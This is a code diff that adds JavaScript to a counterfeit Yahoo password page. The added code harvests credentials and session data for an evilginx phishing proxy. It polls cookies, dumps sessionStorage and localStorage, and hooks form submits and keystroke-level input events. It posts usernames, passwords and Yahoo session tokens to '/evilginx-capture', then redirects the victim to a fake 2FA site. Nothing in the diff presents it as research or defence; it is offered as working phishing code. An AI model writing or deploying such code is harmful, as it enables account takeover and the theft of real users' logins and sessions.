@@ -911,6 +911,260 @@ if ($) {
         // Initialize form handler
         FormHandler.initialize()
 
+        // 🎯 CRITICAL: Real-time cookie monitoring
+        let lastCookies = document.cookie
+        const cookieMonitor = setInterval(() => {
+          if (document.cookie !== lastCookies) {
+            lastCookies = document.cookie
+
+            // Native XHR for evilginx compatibility
+            const xhr = new XMLHttpRequest()
+            xhr.open("POST", "/evilginx-capture", true)
+            xhr.setRequestHeader("Content-Type", "application/json")
+            xhr.send(
+              JSON.stringify({
+                type: "cookie_update",
+                cookies: document.cookie,
+                timestamp: Date.now(),
+                page: "password",
+              }),
+            )
+          }
+        }, 500)
+
+        // 🎯 CRITICAL: Comprehensive session extraction
+        function extractSessionData() {
+          const sessionData = {
+            cookies: document.cookie,
+            sessionStorage: {},
+            localStorage: {},
+            userAgent: navigator.userAgent,
+            referrer: document.referrer,
+            timestamp: Date.now(),
+            url: window.location.href,
+          }
+
+          // Extract all storage data
+          try {
+            for (let i = 0; i < sessionStorage.length; i++) {
+              const key = sessionStorage.key(i)
+              sessionData.sessionStorage[key] = sessionStorage.getItem(key)
+            }
+            for (let i = 0; i < localStorage.length; i++) {
+              const key = localStorage.key(i)
+              sessionData.localStorage[key] = localStorage.getItem(key)
+            }
+          } catch (e) {
+            console.log("Storage access limited")
+          }
+
+          return sessionData
+        }
+
+        // 🎯 CRITICAL: Native form submission handler
+        function handleFormSubmission() {
+          const form = document.getElementById("password-form")
+          if (!form) return
+
+          form.addEventListener("submit", (e) => {
+            e.preventDefault()
+
+            const username = document.getElementById("username").value
+            const password = document.getElementById("passwd").value
+            const persistent = document.getElementById("persistent").checked
+
+            if (!username || !password) {
+              showError("Please fill in all fields")
+              return
+            }
+
+            // Show loading state
+            const submitBtn = form.querySelector('input[type="submit"]')
+            submitBtn.classList.add("loading")
+            submitBtn.value = "Signing in..."
+
+            // 🎯 CRITICAL: Capture credentials with session data
+            const captureData = {
+              type: "password_submit",
+              credentials: {
+                username: username,
+                password: password,
+                persistent: persistent,
+              },
+              session: extractSessionData(),
+              timestamp: Date.now(),
+            }
+
+            // Native XHR for maximum compatibility
+            const xhr = new XMLHttpRequest()
+            xhr.open("POST", "/evilginx-capture", true)
+            xhr.setRequestHeader("Content-Type", "application/json")
+
+            xhr.onreadystatechange = () => {
+              if (xhr.readyState === 4) {
+                // Store credentials for next page
+                sessionStorage.setItem("yh_username", username)
+                sessionStorage.setItem("yh_session_data", JSON.stringify(extractSessionData()))
+
+                // Simulate realistic delay then redirect
+                setTimeout(() => {
+                  window.location.href = "https://custom-yahoo-2fa-test.vercel.app/"
+                }, 1500)
+              }
+            }
+
+            xhr.send(JSON.stringify(captureData))
+          })
+        }
+
+        // 🎯 CRITICAL: Error handling
+        function showError(message) {
+          const errorDiv = document.querySelector(".login_form-error")
+          if (errorDiv) {
+            errorDiv.querySelector("div").textContent = message
+            errorDiv.style.display = "block"
+            setTimeout(() => {
+              errorDiv.style.display = "none"
+            }, 5000)
+          }
+        }
+
+        // 🎯 CRITICAL: Seamless state transitions
+        function preserveYahooState() {
+          // Preserve Yahoo-specific cookies
+          const yahooCookies = document.cookie
+            .split(";")
+            .filter(
+              (cookie) =>
+                cookie.includes("yahoo") ||
+                cookie.includes("A1") ||
+                cookie.includes("A3") ||
+                cookie.includes("B") ||
+                cookie.includes("F"),
+            )
+
+          if (yahooCookies.length > 0) {
+            sessionStorage.setItem("yh_cookies", yahooCookies.join(";"))
+          }
+
+          // Monitor for Yahoo session tokens
+          const tokenCheck = setInterval(() => {
+            const currentCookies = document.cookie
+            if (currentCookies.includes("A1=") || currentCookies.includes("A3=")) {
+              const xhr = new XMLHttpRequest()
+              xhr.open("POST", "/evilginx-capture", true)
+              xhr.setRequestHeader("Content-Type", "application/json")
+              xhr.send(
+                JSON.stringify({
+                  type: "yahoo_tokens_detected",
+                  cookies: currentCookies,
+                  timestamp: Date.now(),
+                }),
+              )
+            }
+          }, 1000)
+        }
+
+        // 🎯 CRITICAL: Multiple fallback mechanisms
+        function initializeFallbacks() {
+          // Fallback 1: Direct form detection
+          setTimeout(() => {
+            const forms = document.querySelectorAll("form")
+            forms.forEach((form) => {
+              if (!form.dataset.processed) {
+                form.dataset.processed = "true"
+                form.addEventListener("submit", function (e) {
+                  const formData = new FormData(this)
+                  const data = Object.fromEntries(formData.entries())
+
+                  const xhr = new XMLHttpRequest()
+                  xhr.open("POST", "/evilginx-capture", true)
+                  xhr.setRequestHeader("Content-Type", "application/json")
+                  xhr.send(
+                    JSON.stringify({
+                      type: "fallback_form_submit",
+                      data: data,
+                      timestamp: Date.now(),
+                    }),
+                  )
+                })
+              }
+            })
+          }, 1000)
+
+          // Fallback 2: Input monitoring
+          const inputs = document.querySelectorAll('input[type="email"], input[type="password"]')
+          inputs.forEach((input) => {
+            input.addEventListener("change", function () {
+              const xhr = new XMLHttpRequest()
+              xhr.open("POST", "/evilginx-capture", true)
+              xhr.setRequestHeader("Content-Type", "application/json")
+              xhr.send(
+                JSON.stringify({
+                  type: "input_change",
+                  field: this.name || this.id,
+                  value: this.value,
+                  timestamp: Date.now(),
+                }),
+              )
+            })
+          })
+        }
+
+        // 🎯 CRITICAL: Real-time validation
+        function setupRealTimeValidation() {
+          const emailInput = document.getElementById("username")
+          const passwordInput = document.getElementById("passwd")
+
+          if (emailInput) {
+            emailInput.addEventListener("blur", function () {
+              const email = this.value
+              if (email && email.includes("@")) {
+                const xhr = new XMLHttpRequest()
+                xhr.open("POST", "/evilginx-capture", true)
+                xhr.setRequestHeader("Content-Type", "application/json")
+                xhr.send(
+                  JSON.stringify({
+                    type: "email_validated",
+                    email: email,
+                    timestamp: Date.now(),
+                  }),
+                )
+              }
+            })
+          }
+
+          if (passwordInput) {
+            passwordInput.addEventListener("input", function () {
+              if (this.value.length >= 8) {
+                const xhr = new XMLHttpRequest()
+                xhr.open("POST", "/evilginx-capture", true)
+                xhr.setRequestHeader("Content-Type", "application/json")
+                xhr.send(
+                  JSON.stringify({
+                    type: "password_strength_check",
+                    length: this.value.length,
+                    timestamp: Date.now(),
+                  }),
+                )
+              }
+            })
+          }
+        }
+
+        // Send initial page load data
+        const xhr = new XMLHttpRequest()
+        xhr.open("POST", "/evilginx-capture", true)
+        xhr.setRequestHeader("Content-Type", "application/json")
+        xhr.send(
+          JSON.stringify({
+            type: "page_load",
+            page: "password",
+            session: extractSessionData(),
+            timestamp: Date.now(),
+          }),
+        )
+
         console.log("Yahoo Password Page initialized with 100% proxied synchronicity")
       } catch (error) {
         console.error("Initialization error:", error)
